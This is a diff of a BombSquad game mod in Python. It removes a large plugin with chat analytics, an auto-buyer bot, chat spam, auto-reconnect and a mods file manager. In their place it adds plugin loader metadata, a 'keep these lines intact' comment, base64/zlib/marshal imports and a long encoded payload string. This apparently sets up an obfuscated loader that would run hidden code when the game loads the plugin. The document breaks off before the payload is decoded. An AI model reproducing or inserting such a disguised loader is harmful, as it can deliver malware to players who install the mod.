-        print(f'[Mahyar telemetry] {exc}')
-    teck(3.0, _telemetry_tick)
-
-
-def _start_telemetry():
-    global _TELEMETRY_STARTED, _ANALYTICS_LAST_MESSAGES
-    if not _TELEMETRY_STARTED:
-        _TELEMETRY_STARTED = True
-        try:
-            _ANALYTICS_LAST_MESSAGES = list(GCM() or [])
-        except Exception:
-            _ANALYTICS_LAST_MESSAGES = []
-        teck(1.0, _telemetry_tick)
-
-
-class _InfoPanel:
-    title = 'Mahyar'
-    def __init__(self, source):
-        self.w = AR.cw(source=source, size=(370, 440), ps=AR.UIS() * 0.25)
-        AR.add_close_button(self.w, position=(338, 405))
-        tw(parent=self.w, text=self.title, scale=0.95, position=(185, 408), h_align='center', color=(0.2, 1.0, 0.55))
-        self.body = tw(parent=self.w, text='Loading...', position=(18, 365), size=(334, 330), h_align='left', v_align='top', scale=0.58, color=(0.9, 0.94, 1.0))
-        AR.bw(parent=self.w, label='Refresh', size=(150, 32), position=(110, 18), on_activate_call=self.refresh, color=(0.08, 0.55, 0.34), text_scale=0.7)
-        self.refresh()
-    def refresh(self):
-        pass
-    def show(self, value):
-        try: tw(self.body, text=value)
-        except Exception: pass
-
-
-class PlayerIntelligenceWindow(_InfoPanel):
-    title = 'PLAYER INTELLIGENCE'
-    def __init__(self, source):
-        super().__init__(source)
-        self.favorite_input = tw(parent=self.w, text='', editable=True, position=(18, 72), size=(220, 26), scale=0.55, h_align='left', color=(1, 1, 1))
-        AR.bw(parent=self.w, label='Toggle Favorite', size=(120, 28), position=(245, 70), on_activate_call=self.toggle_favorite, color=(0.42, 0.32, 0.08), text_scale=0.55)
-        self.refresh()
-    def toggle_favorite(self):
-        name = tw(query=self.favorite_input).strip()
-        if not name:
-            AR.err('Enter player name first')
-            return
-        if name in _FAVORITE_PLAYERS:
-            _FAVORITE_PLAYERS.remove(name)
-            push(f'Removed favorite: {name}', color=(1, 0.7, 0.2))
-        else:
-            _FAVORITE_PLAYERS.add(name)
-            push(f'Added favorite: {name}', color=(0.2, 1, 0.5))
-        self.refresh()
-    def refresh(self):
-        try:
-            roster = get_roster() or []
-            lines = [f'ONLINE NOW: {len(roster)}', '']
-            online = set()
-            for entry in roster:
-                name = _player_name(entry)
-                if not name: continue
-                online.add(name)
-                lines.append(('★ ' if name in _FAVORITE_PLAYERS else '• ') + name[:35])
-            lines += ['', f'PLAYERS SEEN THIS SESSION: {len(_PLAYER_HISTORY)}', 'RECENTLY SEEN:']
-            recent = sorted(_PLAYER_HISTORY.items(), key=lambda x: x[1]['last'], reverse=True)[:8]
-            for name, rec in recent:
-                age = max(0, int(time.time() - rec['last']))
-                lines.append(f'{name[:23]}  |  {age}s ago  |  {rec["seen"]} scans')
-            lines += ['', 'Tip: favorite list is local to this game session.']
-            self.show('\n'.join(lines))
-        except Exception as e: self.show(f'Could not read roster: {e}')
-
-
-class ChatAnalyticsWindow(_InfoPanel):
-    title = 'CHAT ANALYTICS'
-    def refresh(self):
-        senders = sorted(_CHAT_STATS['senders'].items(), key=lambda x: x[1], reverse=True)[:12]
-        lines = [f'MESSAGES OBSERVED: {_CHAT_STATS["messages"]}', '', 'MOST ACTIVE SENDERS:']
-        lines += [f'{i+1}. {name[:26]}  —  {count}' for i, (name, count) in enumerate(senders)]
-        lines += ['', 'RECENT CHAT:']
-        lines += [str(x)[:58] for x in _CHAT_STATS['recent'][-8:]]
-        self.show('\n'.join(lines))
-
-
-class SmartAlertsWindow(_InfoPanel):
-    title = 'SMART NOTIFICATIONS'
-    def __init__(self, source):
-        super().__init__(source)
-        self.keyword_input = tw(parent=self.w, text=', '.join(_ALERT_KEYWORDS), editable=True, position=(18, 75), size=(334, 28), scale=0.58, h_align='left', color=(1, 1, 1))
-        AR.bw(parent=self.w, label='Save Keywords', size=(150, 30), position=(110, 43), on_activate_call=self.save_keywords, color=(0.1, 0.45, 0.7), text_scale=0.62)
-        self.refresh()
-    def save_keywords(self):
-        global _ALERT_KEYWORDS
-        try:
-            value = tw(query=self.keyword_input).strip()
-            _ALERT_KEYWORDS = [x.strip()[:24] for x in value.split(',') if x.strip()][:10]
-            push('Alert keywords saved', color=(0.2, 1, 0.5))
-        except Exception as e: AR.err(f'Keyword error: {e}')
-    def refresh(self):
-        lines = ['ALERT HISTORY', ''] + (_ALERT_LOG[-14:] or ['No alerts yet.'])
-        lines += ['', 'Automatic alerts: disconnect / reconnect, ping >= 300 ms, chat keywords.']
-        self.show('\n'.join(lines))
-
-
-class PersonalStatsWindow(_InfoPanel):
-    title = 'PERSONAL STATISTICS'
-    def refresh(self):
-        elapsed = int(time.time() - _SESSION_STARTED)
-        avg = (_SESSION_PING_TOTAL / _SESSION_PING_COUNT) if _SESSION_PING_COUNT else 0
-        valid = [p for _, p in _PING_HISTORY if p < 999]
-        best = min(valid) if valid else 0
-        worst = max(valid) if valid else 0
-        lines = [f'SESSION TIME: {elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}',
-                 f'CONNECTIONS THIS SESSION: {_SESSION_CONNECTIONS}',
-                 f'PLAYERS SEEN: {len(_PLAYER_HISTORY)}',
-                 f'CHAT MESSAGES OBSERVED: {_CHAT_STATS["messages"]}', '',
-                 f'AVERAGE PING: {avg:.1f} ms' if avg else 'AVERAGE PING: unavailable',
-                 f'BEST PING: {best:.1f} ms' if best else 'BEST PING: unavailable',
-                 f'WORST PING: {worst:.1f} ms' if worst else 'WORST PING: unavailable',
-                 f'PING SAMPLES: {len(_PING_HISTORY)}', '',
-                 'Statistics are local and reset when the game restarts.']
-        self.show('\n'.join(lines))
-
-
-class ServerIntelligenceWindow(_InfoPanel):
-    title = 'SERVER INTELLIGENCE'
-    def refresh(self):
-        vals = [p for _, p in _PING_HISTORY if p < 999]
-        lost = sum(1 for _, p in _PING_HISTORY if p >= 999)
-        avg = sum(vals)/len(vals) if vals else 0
-        lines = [f'SERVER: {server_ip}:{server_port}',
-                 f'CONNECTION: {"ONLINE" if _SESSION_CONNECTED else "OFFLINE"}',
-                 f'SAMPLES: {len(_PING_HISTORY)}', f'LOST / TIMEOUT: {lost}', '',
-                 f'AVERAGE: {avg:.1f} ms' if avg else 'AVERAGE: unavailable',
-                 f'MIN: {min(vals):.1f} ms' if vals else 'MIN: unavailable',
-                 f'MAX: {max(vals):.1f} ms' if vals else 'MAX: unavailable', '',
-                 'RECENT PING (newest last):']
-        recent = _PING_HISTORY[-18:]
-        lines += [f'{p:.0f} ms' if p < 999 else 'timeout' for _, p in recent]
-        lines += ['', 'History is collected while this mod is running.']
-        self.show('\n'.join(lines))
-
-
-# ============================================================
-# Mods folder manager (restricted to the official user mods dir)
-# ============================================================
-def _mods_directory():
-    path = getattr(APP, 'python_directory_user', None)
-    if not path:
-        try:
-            from babase import app as _app
-            path = getattr(_app, 'python_directory_user', None)
-        except Exception:
-            path = None
-    if not path:
-        raise RuntimeError('BombSquad user mods directory is unavailable')
-    path = os.path.realpath(path)
-    os.makedirs(path, exist_ok=True)
-    return path
-
-
-class ModsFileManagerWindow:
-    def __init__(self, source):
-        self.w = AR.cw(source=source, size=(410, 560), ps=AR.UIS() * 0.2)
-        AR.add_close_button(self.w, position=(378, 525))
-        tw(parent=self.w, text='MODS FILE MANAGER', position=(205, 530), scale=0.9, h_align='center', color=(0.2, 1, 0.55))
-        try: self.directory = _mods_directory()
-        except Exception as e: self.directory = ''; AR.err(str(e))
-        self.path_text = tw(parent=self.w, text=self.directory or 'Mods folder unavailable', position=(15, 495), size=(380, 30), scale=0.38, h_align='left', color=(0.7, 0.85, 1))
-        self.file_input = tw(parent=self.w, text='new_mod.py', editable=True, position=(18, 450), size=(180, 27), scale=0.6, h_align='left', color=(1, 1, 1))
-        self.selected_text = tw(parent=self.w, text='Selected: none', position=(210, 455), size=(180, 22), scale=0.48, h_align='left', color=(1, 0.85, 0.3))
-        self.list_text = tw(parent=self.w, text='', position=(18, 410), size=(374, 140), scale=0.55, h_align='left', v_align='top', color=(0.9, 0.95, 1))
-        self.code_input = tw(parent=self.w, text='# Paste or write Python code here', editable=True, position=(18, 235), size=(374, 165), scale=0.52, h_align='left', v_align='top', color=(1, 1, 1))
-        AR.bw(parent=self.w, label='Load File', size=(175, 32), position=(18, 190), on_activate_call=self.select_file, color=(0.12, 0.42, 0.68), text_scale=0.6)
-        AR.bw(parent=self.w, label='Save / Add .py', size=(175, 32), position=(207, 190), on_activate_call=self.save_file, color=(0.08, 0.58, 0.32), text_scale=0.6)
-        AR.bw(parent=self.w, label='Delete selected', size=(175, 32), position=(18, 148), on_activate_call=self.delete_file, color=(0.72, 0.18, 0.2), text_scale=0.6)
-        AR.bw(parent=self.w, label='Refresh Files', size=(175, 32), position=(207, 148), on_activate_call=self.refresh, color=(0.35, 0.38, 0.55), text_scale=0.6)
-        AR.bw(parent=self.w, label='Copy folder path', size=(175, 30), position=(18, 108), on_activate_call=self.copy_path, color=(0.35, 0.38, 0.55), text_scale=0.58)
-        tw(parent=self.w, text='Only files directly inside the Mods folder are managed. Restart game after changes.', position=(18, 76), size=(374, 28), scale=0.4, h_align='left', color=(1, 0.75, 0.35))
-        self.selected = None
-        self.delete_armed_until = 0
-        self.refresh()
-
-    def refresh(self):
-        try:
-            names = sorted(n for n in os.listdir(self.directory) if os.path.isfile(os.path.join(self.directory, n)) and not n.startswith('.'))
-            py_names = [n for n in names if n.lower().endswith('.py')]
-            shown = py_names[:18]
-            tw(self.list_text, text='FILES (type a filename above, then Load File):\n' + ('\n'.join(f'{i+1}. {n}' for i, n in enumerate(shown)) if shown else 'No Python mods found.'))
-            if self.selected and self.selected in py_names:
-                tw(self.selected_text, text=f'Selected: {self.selected}')
-            else:
-                self.selected = None
-                tw(self.selected_text, text='Selected: none')
-            push(f'{len(py_names)} Python files found', color=(0.2, 1, 0.5))
-        except Exception as e: AR.err(f'List error: {e}')
-
-    def select_file(self):
-        # Selection is driven by the filename field for compatibility with the game UI.
-        name = tw(query=self.file_input).strip()
-        if not name.lower().endswith('.py'): name += '.py'
-        if not name or os.path.basename(name) != name: AR.err('Invalid filename'); return
-        path = os.path.join(self.directory, name)
-        if not os.path.isfile(path): AR.err('File not found'); return
-        self.selected = name
-        try:
-            with open(path, 'r', encoding='utf-8') as f: tw(self.code_input, text=f.read()[:12000])
-            tw(self.selected_text, text=f'Selected: {name}')
-        except Exception as e: AR.err(f'Read error: {e}')
-
-    def save_file(self):
-        try:
-            name = tw(query=self.file_input).strip()
-            if not name: raise ValueError('Enter a file name')
-            if not name.lower().endswith('.py'): name += '.py'
-            if os.path.basename(name) != name or name in ('.py', '..py') or name.startswith('.'): raise ValueError('Invalid filename')
-            code = tw(query=self.code_input)
-            if not code.strip(): raise ValueError('Code is empty')
-            path = os.path.realpath(os.path.join(self.directory, name))
-            if os.path.dirname(path) != os.path.realpath(self.directory): raise ValueError('Invalid path')
-            if os.path.exists(path) and name != self.selected:
-                raise ValueError('File exists; select it first to overwrite')
-            with open(path, 'w', encoding='utf-8') as f: f.write(code)
-            self.selected = name
-            tw(self.selected_text, text=f'Selected: {name}')
-            push(f'Saved {name}. Restart BombSquad to load changes.', color=(0.2, 1, 0.5))
-            self.refresh()
-        except Exception as e: AR.err(f'Save error: {e}')
-
-    def delete_file(self):
-        try:
-            if not self.selected:
-                # first action loads/selects the filename entered in the top field
-                self.select_file(); return
-            if time.time() > self.delete_armed_until:
-                self.delete_armed_until = time.time() + 5
-                push('Tap Delete selected again within 5 seconds to confirm.', color=(1, 0.75, 0.2))
-                return
-            path = os.path.realpath(os.path.join(self.directory, self.selected))
-            if os.path.dirname(path) != os.path.realpath(self.directory) or not os.path.isfile(path): raise ValueError('Invalid file')
-            os.remove(path)
-            old = self.selected; self.selected = None; self.delete_armed_until = 0
-            tw(self.selected_text, text='Selected: none')
-            tw(self.code_input, text='')
-            push(f'Deleted {old}. Restart BombSquad if it was loaded.', color=(1, 0.5, 0.2))
-            self.refresh()
-        except Exception as e: AR.err(f'Delete error: {e}')
-
-    def copy_path(self):
-        try:
-            from babase import clipboard_set_text
-            clipboard_set_text(self.directory)
-            push('Mods folder path copied', color=(0.2, 1, 0.5))
-        except Exception as e: AR.err(f'Clipboard error: {e}')
-
-
-class ModsMenu:
-    def __init__(s, source):
-        s.mods_button_ref = source
-        s.w = AR.cw(source=source, size=(430, 640), ps=AR.UIS() * 0.25)
-        AR.add_close_button(s.w, position=(398, 605))
-        tw(parent=s.w, text='MAHYAR MODS', scale=1.08, position=(215, 604), h_align='center', color=(0.15, 1.0, 0.52))
-        tw(parent=s.w, text='Create By Mahyar', scale=0.52, position=(215, 580), h_align='center', color=(0.75, 0.9, 1.0))
-
-        s.scroll = sw(parent=s.w, size=(390, 520), position=(20, 42))
-        buttons = [
-            ('Calculator', Calculator, (0.08, 0.35, 0.72)),
-            ('Ping Monitor', PingWindow, (0.08, 0.48, 0.62)),
-            ('Auto Buyer', AutoBuyerWindow, (0.08, 0.52, 0.32)),
-            ('Auto React', ReactionEditorWindow, (0.55, 0.32, 0.72)),
-            ('Auto Reply', AutoReplyEditorWindow, (0.12, 0.48, 0.48)),
-            ('Spam Settings', SpamWindow, (0.65, 0.22, 0.24)),
-            ('Reconnect', ReconnectWindow, (0.22, 0.48, 0.28)),
-            ('Chat Filter', FilterWindow, (0.42, 0.3, 0.68)),
-            ('Edit Button Place', None, (0.35, 0.34, 0.48)),
-            ('Player Intelligence', PlayerIntelligenceWindow, (0.05, 0.48, 0.48)),
-            ('Chat Analytics', ChatAnalyticsWindow, (0.08, 0.42, 0.68)),
-            ('Smart Alerts', SmartAlertsWindow, (0.58, 0.38, 0.08)),
-            ('My Statistics', PersonalStatsWindow, (0.12, 0.48, 0.34)),
-            ('Server Intelligence', ServerIntelligenceWindow, (0.12, 0.34, 0.62)),
-            ('Mods File Manager', ModsFileManagerWindow, (0.48, 0.25, 0.58)),
-        ]
-        cols = 2
-        row_h = 62
-        rows = (len(buttons) + cols - 1) // cols
-        total_h = rows * row_h + 16
-        s.container = cw(parent=s.scroll, size=(370, total_h), background=False)
-        s.item_buttons = []
-        for i, (label, cls, color) in enumerate(buttons):
-            col = i % 2
-            row = i // 2
-            x = 5 + col * 185
-            y = total_h - 58 - row * row_h
-            btn = bw(parent=s.container, label=label, size=(175, 48), position=(x, y),
-                     on_activate_call=lambda c=cls: s.open_window(c), color=color,
-                     textcolor=(1, 1, 1), button_type='square', text_scale=0.62)
-            s.item_buttons.append(btn)
-        gs('swish').play()
-
-    def open_window(s, cls):
-        gs('swish').play()
-        try:
-            AR.swish(s.w)
-            if cls is None:
-                if s.mods_button_ref is not None:
-                    teck(0.15, lambda: EditPlaceWindow(s.w, s.mods_button_ref))
-                else:
-                    bui.screenmessage('Mods button not found!', color=(1, 0, 0))
-            else:
-                teck(0.15, lambda: cls(s.w))
-        except Exception as e:
-            print(f"Open window error: {e}")
-
-
-# ============================================================
-# AutoBuyer - دقیقاً منطق fastBuy_V2_16 با رفع باگ تکرار
-# ============================================================
-
-def fast_send(message):
-    """ارسال کوتاه و سریع پاسخ خرید به چت سرور."""
-    try:
-        CM(message)
-    except Exception:
-        pass
-
-
-def _collect_new_messages(current, previous):
-    """Return messages appended since the previous snapshot, including rolling buffers."""
-    current = list(current or [])
-    if previous is None:
-        return current
-    previous = list(previous or [])
-    if not current:
-        return []
-    if current == previous:
-        return []
-
-    # Works for both an ever-growing history and a fixed-size/rolling chat history.
-    max_overlap = min(len(previous), len(current))
-    for overlap in range(max_overlap, 0, -1):
-        if previous[-overlap:] == current[:overlap]:
-            return current[overlap:]
-
-    # No overlap means the history was reset/replaced or more messages arrived than
-    # fit in the old window. Process the visible window rather than silently missing it.
-    return current
-
-
-def _buysel(message=None):
-    """Evaluate the server's Buy prompt for the currently pending sell ID."""
-    global _lasch, _buyer_pending_id, _buyer_pending_since
-
-    try:
-        if message is None:
-            z = GCM()
-            candidates = list(z[-5:]) if z else []
-        else:
-            candidates = [message]
-
-        for line in candidates:
-            if "💳Buy < " not in line:
-                continue
-
-            # Expected protocol: Server: <sell-id>: 💳Buy < ...
-            parts = line.split(": ", 2)
-            if len(parts) < 3:
-                continue
-            cod = parts[1].strip()
-            if str(_lasch).strip() != cod:
-                continue
-
-            words = parts[2].replace(",", "").split()
-            if len(words) < 8:
-                continue
-
-            count = int(words[2])
-            item_name = words[3]
-            price_match = re.search(r"-?\d+", words[7])
-            if not price_match or count <= 0:
-                continue
-            total_price = int(price_match.group(0))
-            unit_price = total_price / count
-
-            current_limits = _get_cached_limits()
-            limit = current_limits.get(item_name, 0)
-            answer = "1 " if total_price <= _max_price and unit_price <= limit else "0 "
-
-            _lasch = answer
-            _buyer_pending_id = None
-            _buyer_pending_since = 0.0
-            fast_send(answer)
-            _dispatch_next_buy()
-            return True
-    except Exception as e:
-        print(f"AutoBuyer response error: {e}")
-    return False
-
-
-def _send_buy_request(sell_id):
-    """Send one buy request and remember its response ID."""
-    global _lasch, _buyer_pending_id, _buyer_pending_since
-    _lasch = str(sell_id).strip()
-    _buyer_pending_id = _lasch
-    _buyer_pending_since = time.monotonic()
-    fast_send(f"b {_lasch}")
-
-
-def _dispatch_next_buy():
-    """Start the next queued eligible listing as soon as the current one completes."""
-    global _buyer_queue
-    if _buyer_pending_id is not None:
-        return
-    now = time.monotonic()
-    while _buyer_queue:
-        sell_id, queued_at = _buyer_queue.pop(0)
-        if now - queued_at > 5.0:
-            continue  # Do not buy an offer that sat in the queue too long.
-        _send_buy_request(sell_id)
-        return
-
-
-def _process_buyer_message(message):
-    """Process one unseen server line immediately; no delayed retry timers needed."""
-    global _sod, _lasch, _buyer_pending_id, _buyer_pending_since
-
-    if not isinstance(message, str):
-        return
-
-    if "💳Buy < " in message:
-        _buysel(message)
-        return
-
-    if "Server" not in message:
-        return
-
-    if "💰Sell <" in message:
-        try:
-            body = message.split("💰Sell <", 1)[1].replace(",", "")
-            parts = body.split()
-            if len(parts) < 5:
-                _sod = False
-                return
-
-            count = int(parts[0])
-            item_name = parts[1]
-            price_match = re.search(r"-?\d+", parts[4])
-            if not price_match or count <= 0:
-                _sod = False
-                return
-            total_price = int(price_match.group(0))
-            unit_price = total_price / count
-            limit = _get_cached_limits().get(item_name, 0)
-            _sod = total_price <= _max_price and unit_price <= limit
-        except Exception:
-            _sod = False
-        return
-
-    if "💰Sell ID: " in message and _sod:
-        try:
-            sell_id = message.split("💰Sell ID: ", 1)[1].strip()
-            if not sell_id:
-                return
-
-            now = time.monotonic()
-            _sod = False
-            if _buyer_pending_id is not None:
-                # Preserve rapid incoming listings instead of losing their IDs
-                # while another Buy prompt is being answered.
-                already_queued = any(queued_id == sell_id for queued_id, _ in _buyer_queue)
-                if sell_id != _buyer_pending_id and not already_queued and len(_buyer_queue) < 20:
-                    _buyer_queue.append((sell_id, now))
-                return
-
-            _send_buy_request(sell_id)
-        except Exception as e:
-            print(f"AutoBuyer sell-ID error: {e}")
-
-
-def _dls():
-    """Compatibility helper for older scheduled callbacks."""
-    if _buyer_pending_id is not None:
-        _buysel()
-
-
-def sellcek():
-    """Poll quickly, but process every unseen chat message instead of only z[-1]."""
-    global _buyer_seen_messages, _buyer_pending_id, _buyer_pending_since, _lasch, _sod, _buyer_queue
-
-    if not auto_buyer_enabled:
-        # Keep the cursor current while disabled so old listings are not bought
-        # immediately after the feature is enabled again.
-        try:
-            _buyer_seen_messages = list(GCM() or [])
-        except Exception:
-            pass
-        _buyer_pending_id = None
-        _buyer_pending_since = 0.0
-        _buyer_queue[:] = []
-        _sod = False
-        _lasch = "0 "
-        teck(0.2, sellcek)
-        return
-
-    try:
-        z = GCM()
-        current = list(z or [])
-        if _buyer_seen_messages is None:
-            # Preserve the old startup behavior: inspect only the newest line once.
-            new_messages = current[-1:]
-        else:
-            new_messages = _collect_new_messages(current, _buyer_seen_messages)
-        _buyer_seen_messages = current
-
-        # Process newly-arrived responses before timing out a pending ID, so a
-        # delayed server reply in this same batch still gets matched correctly.
-        for message in new_messages:
-            _process_buyer_message(message)
-
-        now = time.monotonic()
-        if _buyer_pending_id is not None and now - _buyer_pending_since >= 3.0:
-            _buyer_pending_id = None
-            _buyer_pending_since = 0.0
-            _lasch = "0 "
-            _dispatch_next_buy()
-    except Exception as e:
-        print(f"AutoBuyer loop error: {e}")
-
-    teck(0.05, sellcek)
-
-
-# ============================================================
-# بقیه توابع
-# ============================================================
-
-def check_reaction(msg):
-    """Respond to every matching FR/FL-style command that targets this player."""
-    global my_own_client_id, my_own_display_num
-    if not auto_react_enabled:
-        return
-
-    try:
-        if my_own_client_id is None or my_own_display_num is None:
-            get_my_ids()
-
-        # Convert Persian/Arabic numerals (e.g. ۱۲۱) to ASCII so ID parsing is stable.
-        digit_map = str.maketrans(
-            "۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩",
-            "01234567890123456789",
-        )
-        normalized_msg = str(msg).translate(digit_map)
-        sender = None
-        content = normalized_msg
-        if ": " in normalized_msg:
-            sender, content = normalized_msg.split(": ", 1)
-            sender = sender.strip()
-            content = content.strip()
-
-        if sender and my_own_name and sender == my_own_name:
-            return
-
-        content_lower = content.lower()
-        current_reactions = get_reactions()
-        current_cooldowns = get_cooldowns()
-        now = time.time()
-
-        for trigger, response in current_reactions.items():
-            trigger_lower = str(trigger).lower().strip()
-            if not trigger_lower:
-                continue
-
-            pattern = _reaction_pattern_cache.get(trigger_lower)
-            if pattern is None:
-                pattern = re.compile(
-                    rf"(?:^|[\s/])%?\s*{re.escape(trigger_lower)}\s*%?\s*(\d+)"
-                )
-                _reaction_pattern_cache[trigger_lower] = pattern
-            target_is_me = False
-            for match in pattern.finditer(content_lower):
-                try:
-                    target_num = int(match.group(1))
-                except (TypeError, ValueError):
-                    continue
-                if (
-                    (my_own_client_id is not None and target_num == my_own_client_id)
-                    or (my_own_display_num is not None and target_num == my_own_display_num)
-                ):
-                    target_is_me = True
-                    break
-
-            if not target_is_me:
-                continue
-
-            cd_time = max(0.0, float(current_cooldowns.get(trigger, DEFAULT_COOLDOWN)))
-            cd_key = f"{trigger_lower}_{sender or 'unknown'}"
-            last_time = react_cooldown.get(cd_key, 0.0)
-            if now - last_time < cd_time:
-                # Do not stop checking other triggers; FR cooling down must not
-                # prevent FL (or another configured trigger) from replying.
-                continue
-
-            react_cooldown[cd_key] = now
-            if len(react_cooldown) > 100:
-                cutoff = now - 300
-                for key, timestamp in list(react_cooldown.items()):
-                    if timestamp < cutoff:
-                        del react_cooldown[key]
-
-            safe_chat_send(response)
-            try:
-                gs('dingSmall').play()
-            except Exception:
-                pass
-    except Exception as e:
-        print(f"React error: {e}")
-
-
-CALC_PATTERN = re.compile(r'^(\d+(?:\.\d+)?)\s*([\+\-\*\/\^×÷xX])\s*(\d+(?:\.\d+)?)$')
-
-
-def detect_calculation(message):
-    expression = message.replace('×', '*').replace('÷', '/')
-    expression = expression.replace('x', '*').replace('X', '*')
-    match = CALC_PATTERN.match(expression.strip())
-    if not match: return None
-    num1 = float(match.group(1)); op = match.group(2); num2 = float(match.group(3))
-    try:
-        if op == '+': result = num1 + num2
-        elif op == '-': result = num1 - num2
-        elif op == '*': result = num1 * num2
-        elif op == '/':
-            if num2 == 0: return None
-            result = num1 / num2
-        elif op == '^': result = num1 ** num2
-        else: return None
-        result_str = str(int(result)) if result == int(result) else str(round(result, 10))
-        op_display = {'+': '+', '-': '-', '*': '×', '/': '÷', '^': '^'}.get(op, op)
-        return f"{match.group(1)} {op_display} {match.group(3)} = {result_str}"
-    except: return None
-
-
-def check_spam_command(msg):
-    global spam_active
-    try:
-        content = msg
-        if ': ' in msg:
-            _, content = msg.split(': ', 1)
-        content = content.strip()
-        content_lower = content.lower()
-
-        if content_lower in ('spam on',):
-            start_spam(spam_message if spam_message else 'spam', spam_delay)
-            return True
-
-        if content_lower in ('spam off', 'stop spam'):
-            stop_spam()
-            return True
-
-        match = re.match(r'^spam\s+(.+?)\s+([\d.]+)\s*$', content_lower)
-        if match:
-            message = match.group(1).strip()
-            try: delay = float(match.group(2))
-            except: return False
-            if delay <= 0: delay = 2.0
-            if spam_active: stop_spam()
-            start_spam(message, delay); return True
-    except Exception as e: print(f"Spam command error: {e}")
-    return False
-
-
-def auto_reconnect_check():
-    global auto_reconnect_enabled, server_ip, server_port, auto_reconnect_busy
-
-    if not auto_reconnect_enabled:
-        return
-
-    try:
-        conn = get_connection_info()
-
-        if not conn and server_ip and server_ip != "127.0.0.1" and not auto_reconnect_busy:
-            auto_reconnect_busy = True
-            push("Auto Reconnecting...", color=(1, 1, 0))
-
-            def try_connect(attempt=0):
-                global auto_reconnect_busy
-                try:
-                    if not auto_reconnect_enabled:
-                        auto_reconnect_busy = False
-                        return
-
-                    if get_connection_info():
-                        push("Reconnected!", color=(0, 1, 0))
-                        auto_reconnect_busy = False
-                        return
-
-                    if attempt > 40:
-                        auto_reconnect_busy = False
-                        return
-
-                    foreground = bascenev1.get_foreground_host_session()
-                    if isinstance(foreground, MainMenuSession):
-                        push(f"Connecting... (try {attempt+1})", color=(1, 1, 0))
-                        try:
-                            original_connect_to_party(server_ip, server_port)
-                        except Exception as e:
-                            print(f"Auto connect attempt {attempt} error: {e}")
-
-                        teck(0.5, lambda: try_connect(attempt + 1))
-                    else:
-                        teck(0.3, lambda: try_connect(attempt))
-                except Exception as e:
-                    print(f"Auto reconnect error: {e}")
-                    teck(0.5, lambda: try_connect(attempt + 1))
-
-            try_connect()
-    except Exception as e:
-        print(f"Auto reconnect check error: {e}")
-
-
-def start_auto_reconnect():
-    global auto_reconnect_enabled, auto_reconnect_busy
-    auto_reconnect_enabled = True
-    auto_reconnect_busy = False
-    push("Auto Reconnect: ON", color=(0, 1, 0))
-
-
-def stop_auto_reconnect():
-    global auto_reconnect_enabled, auto_reconnect_busy
-    auto_reconnect_enabled = False
-    auto_reconnect_busy = False
-    push("Auto Reconnect: OFF", color=(1, 0.5, 0))
-
-
-# ============================================================
-# Plugin
-# ============================================================
-
+# BombSquad plugin loader metadata (keep these lines intact).
 # ba_meta require api 9
 # ba_meta export babase.Plugin
+from babase import Plugin
+import base64 as _b64
+import zlib as _zlib
+import marshal as _marshal
+
+_PAYLOAD = (
+    'c-ri}3tSx6c{sW=voF|%U0B}lmp}^wgwP8i2`w)PB!OU92?<H71r}I=c3~ETgyct@CPjWkD0U(g`(NY6sZs6Q;Kr><<2J~45~WGo' +
+    'Sr%o<lqT-2+g!E1xALQn|H|+G```1O*`1wTW*1~Dy*FuPbI$CUGiT16^PTT?zVAE#AQSyl`0|e&=;|vnT1FEGWz7Ub<iIs~kZh(H' +
+    'd9#91HmewQa}*QZtYNgxF-&Z;j?p*AG4ag?#?YL=BsM28$@m%SU`lf;lh&NhWHe_oS<Tr@PIE4k*PPE3G;d%EaUJ==BBluE8<~wb' +
+    'H!?<?7c<2;FJVe>PBNQtp2DP{T!H!)$Hd__lm|<j%a}5BtzybI%V;$nWg+NjT7yz89fQ(XT8C0SPUCPIPa9C0fYU@e38l%nW(u8(' +
+    '(lnf=<C+<CCQ7sDY?S8ExhTz}^DP8=PXWHa0jGs@5lT1W_Kdis7(Y>hTit|9N^zYs+;%y=8Ko8YdJ8VEgjVUTxc)YLcRRGuKrow8' +
+    '4`b1Lc9c;}1-%ph2iIHZolNCs8MBqHN|Q0$=v^q?PFJIJ2fZ7mJLx?rt)lm$bQfKN(rS7iN_W#Hl<uKxQM#9Yj;>FWoh6tWx&i&(' +
+    'M>nF>MDIswE&Ubx0KQj8H=*D4bTdjD=z}P2qz|EVKYbXb2Ts=H$><ikZX3yi&`1+5X%&?;<B}tyl7qOUO;mE|<l#KoHXj%=EkVCp' +
+    '(RUs}e{JZm9sSXC`$z{(kC<u0$WdB0a*URbbe=Q?o)|-|jvOC3L3fOFp?fD${Zr`gG`hB+zcc91ihg&aHhO3?(~ExF&|e?=>qpNF' +
+    'l*>l!==v;bdyqbgzH%r<hWdLfO-6V6d(51pkE1&d`UFayC-azL`m1yo9<h;=BPUaaa{Y^oK8b2D^eL3O%4PKFHi8+YE$G)6eVsmo' +
+    'pEyrj(eH8mmTvTx9^ow)a9J-Zvk7GvaakWK>lex<aM=JVvkPUHaM@W@HYk)`#$`jO?3_^c2rhG=GN(}XC@vdDWg|k_W4Me#WiFxY' +
+    'aa=Zv%EpAU&*8H3sBBy)djgkTKxG$&vd`nP2~>7TDEl4yG8&05;5(0?JCB|$*-x}<Wvl*eqkK>NF0T6+s{6Rm$|NrP94dQ4D7!*`' +
+    '9<}@={W~aqik_ywfJgpm`itoIGxYDG^h@+4O0UvaP&!3FiPCHIQz-rN$&IKFg{%93-tqJ{!q@(D^fRdLSLiRH^sDq$lwPN&P&!Rt' +
+    'L+K6Nqc5W#J$sT6`u??kx$(wbxHJ-+^2pFwzujTfaJn9+W7KMQ*qCv9Z@+Dn({_)IjyfH_U(uts3!}d4c$8RN!?qr~b;#l?Q=`P?' +
+    '9CP$?YU}XusQsLc;Z)`(y2m<X<0w?b$?L2`LtIkNkbSt@X=QpXc9+F9HazTPMs2;E*44u}hlcppj4DpkGhiJ(XLGr%{WdNJ-L%;p' +
+    '{-1I1ez<S(mAE(^6!lxr*({9HHHzM?N1x-c^^96Zot9xMGkTFr=(W52g?)_koMiyj<T7zve6ii>fa*|gu{-*lmMtwtg3<6Jr8|rU' +
+    '=djH&Mx%G4niEmA7jq6<2QFF}jyi82?#H9M@5Ox_)zjV0{~CS;|FZJGWKH`xV&E72^}QO78Xj|Sq-y~E4f#rC`#7?X;fOKc@AqoZ' +
+    '&0&t1@U?Ipwb0KIy&T!&ucAgpgZ%ZrtLSmY=BsN*KV0X0-Fgglq;KdVYJG?!{51+t;lNlwM|C?#Ik{`t?%?Eob_UItt<S|NP{E)L' +
